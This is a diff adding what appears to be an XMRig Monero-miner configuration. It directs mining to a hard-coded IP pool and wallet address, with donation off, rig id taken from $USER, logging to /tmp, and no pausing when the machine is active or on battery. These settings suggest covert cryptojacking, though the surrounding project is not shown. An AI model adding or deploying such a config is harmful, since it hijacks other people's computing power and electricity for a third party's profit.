@@ -1,0 +1,114 @@
+{
+    "api": {
+        "id": null,
+        "worker-id": "$USER"
+    },
+    "http": {
+        "enabled": true,
+        "host": "127.0.0.1",
+        "port": 37841,
+        "access-token": null,
+        "restricted": true
+    },
+    "autosave": true,
+    "background": false,
+    "colors": true,
+    "title": true,
+    "randomx": {
+        "init": -1,
+        "init-avx2": -1,
+        "mode": "fast",
+        "1gb-pages": true,
+        "rdmsr": true,
+        "wrmsr": true,
+        "cache_qos": true,
+        "numa": true,
+        "scratchpad_prefetch_mode": 1
+    },
+    "cpu": {
+        "enabled": true,
+        "huge-pages": true,
+        "huge-pages-jit": false,
+        "hw-aes": null,
+        "priority": null,
+        "memory-pool": false,
+        "yield": false,
+        "asm": true,
+        "argon2-impl": null,
+        "argon2": [0, 1],
+        "cn": [
+            [1, 0],
+            [1, 1]
+        ],
+        "cn-heavy": [
+            [1, 0],
+            [1, 1]
+        ],
+        "cn-lite": [
+            [1, 0],
+            [1, 1]
+        ],
+        "cn-pico": [
+            [2, 0],
+            [2, 1]
+        ],
+        "cn/upx2": [
+            [2, 0],
+            [2, 1]
+        ],
+        "ghostrider": [
+            [8, 0]
+        ],
+        "rx": [0, 1],
+        "rx/wow": [0, 1],
+        "cn-lite/0": false,
+        "cn/0": false,
+        "rx/arq": "rx/wow"
+    },
+    "log-file": "/tmp/xmrig.log",
+    "donate-level": 0,
+    "donate-over-proxy": 0,
+    "pools": [
+        {
+            "algo": "rx/0",
+            "coin": "XMR",
+            "url": "20.62.43.171:4444",
+            "user": "42ykwPdhRp9YNaXVJ3jrXnKzF84CneMdoPTTC4SFzqUVHkXmUocKG9FYo8wWymMgApCiyKkYfCb9USPvV9Er67ce86xu7Ho",
+            "pass": "",
+            "rig-id": "$USER",
+            "nicehash": false,
+            "keepalive": true,
+            "enabled": true,
+            "tls": false,
+            "sni": false,
+            "tls-fingerprint": null,
+            "daemon": false,
+            "socks5": null,
+            "self-select": null,
+            "submit-to-origin": false
+        }
+    ],
+    "retries": 5,
+    "retry-pause": 3,
+    "print-time": 30,
+    "dmi": true,
+    "syslog": false,
+    "tls": {
+        "enabled": false,
+        "protocols": null,
+        "cert": null,
+        "cert_key": null,
+        "ciphers": null,
+        "ciphersuites": null,
+        "dhparam": null
+    },
+    "dns": {
+        "ipv6": false,
+        "ttl": 30
+    },
+    "user-agent": null,
+    "verbose": 1,
+    "watch": true,
+    "pause-on-battery": false,
+    "pause-on-active": false
+}
